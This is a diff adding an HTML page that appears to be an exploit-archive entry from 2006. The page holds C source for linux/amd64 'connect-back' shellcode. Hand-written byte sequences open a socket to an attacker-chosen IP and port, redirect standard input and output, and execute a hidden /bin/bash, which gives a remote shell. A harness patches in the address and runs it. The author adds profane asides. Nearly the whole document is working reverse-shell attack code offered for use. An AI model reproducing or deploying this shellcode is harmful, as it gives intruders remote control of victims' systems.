@@ -1,0 +1,125 @@
+<html><head><title>linux/amd64 connect-back semi-stealth shellcode 88+ bytes</title></head><pre>#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;limits.h&gt;
+
+
+/*
+
+	usual rant here.. this is just a doodle.. i was curious about
+	the amd64 and since i dont think a simple exec /bin/sh is worth releasing
+	
+	i give you, my amd64 connect-back semi-stealth shellcode.. i say semi-stelth
+	because it contains the bullshit feature that /bin/bash isnt /easily/ noticable
+	
+	this code uses both 32 and 64 bit instructions, and uses only 64 bit kernel entrypoints
+	
+	if you might say &quot;but..phar.. linux has 32 bit compatability.. and i can just use existing shellcode&quot;
+	
+	to that my answer is &quot;fuck you&quot;.. i mean.. &quot;there is actually an option to disable 32bit compatability..
+	i checked.. its there... i promise&quot;
+	
+	im not entirely sure the C crap below will do what you want.. but the shellcode is good and can be edited
+	by hand if needed.. (dont forget to invert)
+	
+	bpp.etherdyne.net
+	www.stonedcoder.org
+	phar[at]stonedcoder[dot]org
+
+*/
+
+char sc_raw[] = 
+&quot;\x48\x31\xd2&quot;                     // xor    %rdx,%rdx
+&quot;\x6a\x01&quot;                         // pushq  $0x1
+&quot;\x5e&quot;                             // pop    %rsi
+&quot;\x6a\x02&quot;                         // pushq  $0x2
+&quot;\x5f&quot;                             // pop    %rdi
+&quot;\x6a\x29&quot;                         // pushq  $0x29
+&quot;\x58&quot;                             // pop    %rax
+&quot;\x0f\x05&quot;                         // syscall								#socket
+
+&quot;\x48\x97&quot;                         // xchg   %rax,%rdi						#in_sockaddr, rax does equal 2 but i think i can get away with this
+&quot;\x50&quot;                             // push   %rax
+&quot;\x48\xb9\x00\x00\x00\x00\x11&quot;     // mov    $0x4141414141414141,%rcx
+&quot;\x11\xff\xfd&quot;
+&quot;\x48\xf7\xd1&quot;                     // not    %rcx
+&quot;\x51&quot;                             // push   %rcx
+&quot;\x48\x89\xe6&quot;                     // mov    %rsp,%rsi
+&quot;\x6a\x10&quot;                         // pushq  $0x10
+&quot;\x5a&quot;                             // pop    %rdx
+&quot;\x6a\x2a&quot;                         // pushq  $0x2a
+&quot;\x58&quot;                             // pop    %rax
+&quot;\x0f\x05&quot;                         // syscall								#connect
+
+&quot;\x6a\x03&quot;                         // pushq  $0x3
+&quot;\x5e&quot;                             // pop    %rsi
+//dup_loop:
+&quot;\x6a\x21&quot;                         // pushq  $0x21
+&quot;\x58&quot;                             // pop    %rax
+&quot;\x48\xff\xce&quot;                     // dec    %rsi
+&quot;\x0f\x05&quot;                         // syscall								#dup2
+
+
+&quot;\x75\xf6&quot;                         // jne    4004c5 &lt;dup_loop&gt;
+&quot;\x48\xbb\xd0\x9d\x96\x91\xd0&quot;     // mov    $0xff978cd091969dd0,%rbx
+&quot;\x8c\x97\xff&quot;
+&quot;\x48\xf7\xd3&quot;                     // not    %rbx
+&quot;\x53&quot;                             // push   %rbx
+&quot;\x48\x89\xe7&quot;                     // mov    %rsp,%rdi
+&quot;\x48\x31\xc0&quot;                     // xor    %rax,%rax
+&quot;\x50&quot;                             // push   %rax
+&quot;\x57&quot;                             // push   %rdi
+&quot;\x48\x89\xe6&quot;                     // mov    %rsp,%rsi
+&quot;\x48\x31\xd2&quot;                     // xor    %rdx,%rdx
+&quot;\xb0\x3b&quot;                         // mov    $0x3b,%al
+&quot;\x0f\x05&quot;                         // syscall								#exec
+;
+
+#define HOSTOFFSET 19
+#define PORTOFFSET 23
+
+void scprint(char * foo, int len);
+void usage();
+
+void (*shellcode)() = sc_raw;
+
+main(int argc, char *argv[]){
+uint32 host;
+uint16 port;
+
+
+	if(argc != 3){	//i'll only do so much to save you from stupidity
+		usage();
+		exit(1);
+	}
+
+	host =~ (int)inet_addr(argv[1]);
+
+	port =~ htons(atoi(argv[2]));
+
+	memcpy(&amp;sc_raw[HOSTOFFSET],&amp;host,4);
+	memcpy(&amp;sc_raw[PORTOFFSET],&amp;port,2);
+	scprint(sc_raw,sizeof(sc_raw));
+	shellcode();
+}
+
+
+void scprint(char * foo, int len){
+int i;
+
+	printf(&quot;char shellcode[]=\&quot;&quot;);
+	for(i = 0; i &lt; len; i++){
+		printf(&quot;\\x%02x&quot;,(char)foo[i]&amp;0xff);
+	}
+	printf(&quot;\&quot;;\n&quot;);
+	fflush(stdout);
+}
+
+void usage(){
+	printf(&quot;./%s [&lt;ip address.. and i mean ip address&gt;] [&lt;port number&gt;]\n\n&quot;);
+}
+
+// milw0rm.com [2006-04-21]</pre></html>
